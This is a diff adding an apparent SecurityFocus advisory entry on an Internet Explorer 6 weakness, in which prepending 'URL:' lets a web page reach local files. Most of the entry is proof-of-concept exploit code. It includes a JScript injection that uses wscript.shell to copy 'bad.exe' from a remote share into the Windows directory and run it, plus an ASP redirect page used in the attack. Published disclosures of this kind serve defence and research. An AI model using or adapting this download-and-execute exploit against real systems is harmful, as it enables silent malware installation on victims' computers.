@@ -1,0 +1,49 @@
+source: http://www.securityfocus.com/bid/10472/info
+
+Microsoft Internet Explorer is prone to a security weakness that may permit unauthorized access to local resources on a client computer. This will effectively bypass security restrictions implemented in Internet Explorer 6 SP1. Specifically, a malicious Web page may access a file on a vulnerable client computer by pre-pending "URL:" to a request for a specific resource.
+
+This weakness is useful when exploiting other vulnerabilities, such as vulnerabilities that allow cross-zone access.
+
+URL:ms-its:C:\WINDOWS\Help\iexplore.chm::/iegetsrt.htm
+
+There are reported of exploits circulating in the wild that use this and BID 10473.
+
+A proof-of-concept has been published at the following location:
+
+http://62.131.86.111/security/idiots/repro/installer.htm
+
+An additional proof of concept exploit supplied by, Ferruh Mavituna, that is reported to bypass vendor fixes is available:
+New shellscript.js
+=====================================================
+function injectIt() {
+
+document.frames[0].document.body.insertAdjacentHTML('afterBegin','injected<s
+cript language="JScript" DEFER> var
+rF="\\\\\\\\IPADDRESS\\\\NULLSHAREDFOLDER\\\\bad.exe"; var
+wF="%windir%\\\\_tmp.exe"; var o=new ActiveXObject("wscript.shell"); var
+e="%comspec% /c copy "+rF+" "+wF; var
+err=o.Run(e,0,true);if(err==0)o.Run(wF,0,false);</script>');
+}
+document.write('<iframe src="shell:WINDOWS\\Web\\TIP.HTM"></iframe>');
+setTimeout("injectIt()", 1000);
+=====================================================
+
+Also for testing in IIS Servers; ASP equivalent of redir.jsp
+
+redir.asp
+=====================================================
+<%
+Response.Expires = 1
+Response.Expiresabsolute = Now() - 1
+Response.AddHeader "pragma","no-cache"
+Response.AddHeader "cache-control","private"
+Response.CacheControl = "no-cache"
+For x = 1 to 500000 'Time
+z = z + 10
+Next
+
+Response.Status = "302 Found"
+Response.AddHeader "Content-Length", "4"
+Response.AddHeader "Location","URL:res://shdoclc.dll/HTTP_501.htm"
+%>
+=====================================================
